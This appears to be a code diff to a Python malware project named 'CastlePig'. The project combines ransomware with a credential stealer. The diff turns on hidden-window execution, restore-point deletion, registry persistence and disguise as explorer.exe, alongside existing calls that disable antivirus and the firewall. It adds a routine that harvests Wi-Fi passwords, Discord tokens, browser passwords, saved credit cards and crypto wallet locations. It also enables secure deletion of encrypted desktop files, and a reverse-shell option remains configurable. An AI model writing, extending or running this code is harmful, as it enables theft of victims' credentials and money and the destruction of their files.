@@ -4,7 +4,6 @@ import castle_pig.anti_analysis
 castle_pig.anti_analysis.check_for_suspicious_processes()
 castle_pig.anti_analysis.disable_defender_and_firewall()
 
-
 import os
 import threading
 import castle_pig.file_encrypter
@@ -14,63 +13,105 @@ import castle_pig.secure_password
 import castle_pig.keyring_password
 import castle_pig.desktop_files
 import castle_pig.reverse_shell
-
-import castle_pig.persistence
+import castle_pig.secure_delete
+# Delete all restore points
+import castle_pig.restore_point_cleaner
+castle_pig.restore_point_cleaner.delete_all_restore_points()
 # Add registry persistence
+import castle_pig.persistence
 castle_pig.persistence.add_registry_persistence()
-
-import castle_pig.process_blender
 # Set the window title to mimic a legitimate process
+import castle_pig.process_blender
 castle_pig.process_blender.set_process_title_windows("explorer.exe")
 # Uncomment below to run in a hidden window
-# castle_pig.process_blender.run_hidden_windows()
+castle_pig.process_blender.run_hidden_windows()
 
-# Secure delete
-import castle_pig.secure_delete
 
-#
-#
-#
-# CastlePig Data Exfiltration
+# ===================================
+# === CastlePig Data Exfiltration ===
+# ===================================
 
-# Wifi
+# imports
 from data_grabber.wifi_grabber import grab_wifi_passwords
-
-wifi_data = grab_wifi_passwords()
-with open("log.txt", "a") as log:
-    log.write("Wi-Fi Name                    | Password\n")
-    log.write("------------------------------------------\n")
-    for ssid, password in wifi_data:
-        log.write(f"{ssid:<30}| {password}\n")
-
-# Discord
 from data_grabber.discord_token_grabber import find_discord_tokens
-
-tokens = find_discord_tokens()
-with open("log.txt", "a") as log:
-    log.write("Discord Tokens:\n")
-    for token in tokens:
-        log.write(token + "\n")
-
-# Browser Passwords, cards, bookmarks
+from data_grabber.system_info_grabber import get_system_info
+from data_grabber.crypto_wallet_grabber import find_wallets
 from data_grabber.browser_data_grabber import (
     extract_browser_passwords,
     extract_browser_cards,
     extract_browser_bookmarks
 )
 
-with open("log.txt", "a", encoding="utf-8") as log:
-    log.write("Browser Passwords:\n")
-    for entry in extract_browser_passwords():
-        log.write(f"[{entry['browser']}] {entry['url']} | {entry['username']} | {entry['password']}\n")
+def log_all_data():
+    with open("log.txt", "a", encoding="utf-8") as log:
+        # Wi-Fi Passwords
+        try:
+            wifi_data = grab_wifi_passwords()
+            log.write("Wi-Fi Name                    | Password\n")
+            log.write("------------------------------------------\n")
+            for ssid, password in wifi_data:
+                log.write(f"{ssid:<30}| {password}\n")
+            log.write("\n")
+        except Exception as e:
+            log.write(f"[ERROR] Wi-Fi password extraction failed: {e}\n\n")
 
-    log.write("\nBrowser Credit Cards:\n")
-    for entry in extract_browser_cards():
-        log.write(f"[{entry['browser']}] {entry['name']} | {entry['card_number']} | {entry['exp_month']}/{entry['exp_year']}\n")
+        # Discord Tokens
+        try:
+            tokens = find_discord_tokens()
+            log.write("Discord Tokens:\n")
+            for token in tokens:
+                log.write(token + "\n")
+            log.write("\n")
+        except Exception as e:
+            log.write(f"[ERROR] Discord token extraction failed: {e}\n\n")
 
-    log.write("\nBrowser Bookmarks:\n")
-    for entry in extract_browser_bookmarks():
-        log.write(f"[{entry['browser']}] {entry['name']} | {entry['url']}\n")
+        # Browser Passwords
+        try:
+            log.write("Browser Passwords:\n")
+            for entry in extract_browser_passwords():
+                log.write(f"[{entry['browser']}] {entry['url']} | {entry['username']} | {entry['password']}\n")
+            log.write("\n")
+        except Exception as e:
+            log.write(f"[ERROR] Browser password extraction failed: {e}\n\n")
+
+        # Browser Credit Cards
+        try:
+            log.write("Browser Credit Cards:\n")
+            for entry in extract_browser_cards():
+                log.write(f"[{entry['browser']}] {entry['name']} | {entry['card_number']} | {entry['exp_month']}/{entry['exp_year']}\n")
+            log.write("\n")
+        except Exception as e:
+            log.write(f"[ERROR] Browser card extraction failed: {e}\n\n")
+
+        # Browser Bookmarks
+        try:
+            log.write("Browser Bookmarks:\n")
+            for entry in extract_browser_bookmarks():
+                log.write(f"[{entry['browser']}] {entry['name']} | {entry['url']}\n")
+            log.write("\n")
+        except Exception as e:
+            log.write(f"[ERROR] Browser bookmark extraction failed: {e}\n\n")
+
+        # System Information
+        try:
+            info = get_system_info()
+            log.write("System Information:\n")
+            for k, v in info.items():
+                log.write(f"{k}: {v}\n")
+            log.write("\n")
+        except Exception as e:
+            log.write(f"[ERROR] System info extraction failed: {e}\n\n")
+
+        # Crypto Wallets
+        try:
+            wallets = find_wallets()
+            log.write("Crypto Wallets Found:\n")
+            for name, path in wallets:
+                log.write(f"{name}: {path}\n")
+            log.write("\n")
+        except Exception as e:
+            log.write(f"[ERROR] Crypto wallet extraction failed: {e}\n\n")
+
 
 # .env loadenv file is populated
 # Uncomment below to use and clean up any unneeded code
@@ -125,12 +166,16 @@ ENCRYPTED_FOLDER = "EncryptedFiles"
 ENABLE_REVERSE_SHELL = False  # Set to True to enable reverse shell
 REVERSE_SHELL_IP = "127.0.0.1"
 REVERSE_SHELL_PORT = 4444
-DELTE_FILE = False
+DELETE_FILE = True
+
+
 
 # Get all files from the user's Desktop (recursively)
 files = castle_pig.desktop_files.get_all_files_from_desktop() # Assuming this is in desktop_files
 
 def main():
+    # init grab data
+    log_all_data()
     # 0. Optionally run reverse shell in a background thread
     if ENABLE_REVERSE_SHELL:
         rs = threading.Thread(
@@ -163,10 +208,10 @@ def main():
         encrypted_path = castle_pig.file_encrypter.encrypt_file(
             _file,
             password=password,
-            delete_original=True,
+            delete_original=DELETE_FILE,
             move_to_folder=ENCRYPTED_FOLDER
         )
-        if DELTE_FILE:
+        if DELETE_FILE:
             castle_pig.secure_delete.secure_delete(_file)
             print(f"Deleted: {_file}")
         else:
